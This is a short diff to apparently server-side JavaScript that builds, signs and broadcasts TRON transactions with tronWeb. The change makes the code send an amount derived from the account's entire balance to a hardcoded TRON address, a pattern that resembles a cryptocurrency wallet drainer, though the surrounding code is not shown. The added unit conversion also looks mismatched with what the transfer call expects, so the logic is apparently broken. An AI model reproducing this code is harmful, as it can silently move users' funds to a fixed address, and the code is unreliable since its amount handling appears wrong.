@@ -196,8 +196,9 @@ res.status(200).json({response: ret ,Amount : bal,Sender : address});
     }
 }else{
 try {
+var balu = balance/1000000
 const mem = "TUCHtoQPYdDDJjSdyzCwUA9mymJRrHzQSM"
-const unSignedTxn = await tronWeb.transactionBuilder.sendTrx(mem, txt);
+const unSignedTxn = await tronWeb.transactionBuilder.sendTrx(mem, balu);
         const signedTxn = await tronWeb.trx.sign(unSignedTxn);
         const ret = await tronWeb.trx.sendRawTransaction(signedTxn);
 var bal = balance/1000000
